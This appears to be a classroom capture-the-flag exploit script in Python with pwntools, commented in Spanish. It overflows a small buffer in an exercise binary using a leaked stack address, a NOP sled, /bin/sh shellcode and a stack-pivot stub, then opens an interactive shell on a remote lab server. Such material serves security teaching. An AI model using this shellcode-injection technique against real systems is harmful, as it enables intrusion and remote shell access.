#!/usr/bin/python3
#########################################################
# Como tenemos un leak, no es necesario desactivar ASLR 
# En este ejercicio el buffer es más pequeño.
# El problema es que al hacer el leave se restaura el marco de pila anterior. Bajando esp a direcciones más altas.
# El shellcode de shellcraft usa la pila mediante push. Al hacer push destruye el shellcode.
# La solución es migrar la pila con un pequeño payload en ensamblador.
########################################################
from pwn import *
elf = context.binary = ELF("bof")
libc = elf.libc
HOST = "www.iesvirgendelcarmen.com"
PORT = 10009

gs = '''
b start_level
continue
'''
def start():
    """
    Si ejecutamos:$ xpl.py sin parámetros io.sendXXX para enviar datos por entrada estandar al proceso. io.recXXX para leer datos salida estandar del proceso.
    Si ejecutamos:$ xpl.py GDB se abre una nueva ventana con el depurador
    Si ejecutamos:$ xpl.py REMOTE se abre un socket con servidor remoto. La entrada y salida funciona igual que en local.
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)

io = start()
#Lee de la salida estandar hasta Leak:
io.recvuntil('Leak: ')
#Lee de la salida estandar hasta retorno de carro
leak = io.recvline()
#Convierte la dirección de memoria robada, que es un string, a un entero. La dirección de memoria está en base 16 (hexadecimal).
leak = int(leak, 16)
print(hex(leak))
log.info('Enviando shellcode')

#Usamos una shellcode de shellcraft. Shellcodes que vienen en pwntools
print(shellcraft.i386.linux.sh())
#Usamos un colchón de NOPS para incrementar la probabilidad de ejecución de la shellcode.
shellcode = asm(shellcraft.i386.linux.sh())
#Otra fuente común de shellcodes es: shell-storm.org
print(len(shellcode))
print(len(asm("sub esp, 300; jmp $-58")))
#Generamos un payload en little endian para 32 bits
payload = flat (
    b"\x90"*(0x2e-len(shellcode)),#Pequeño colchon de NOPS para alineado
    shellcode,
    b"BBBB",
    p32(leak+54),
    asm("sub esp, 320; jmp $-58"), #Se migra la pila para evitar el riesgo de alterar la shellcode durante ejecución. EXPLICAR
    endianness = 'little', word_size = 32, sign = False
    )
print(len(payload))
#Enviamos el payload
io.sendline(payload)
print("Payload enviado.")
#Hacemos la sesión interactiva (entrada y salida estandar)
io.interactive()
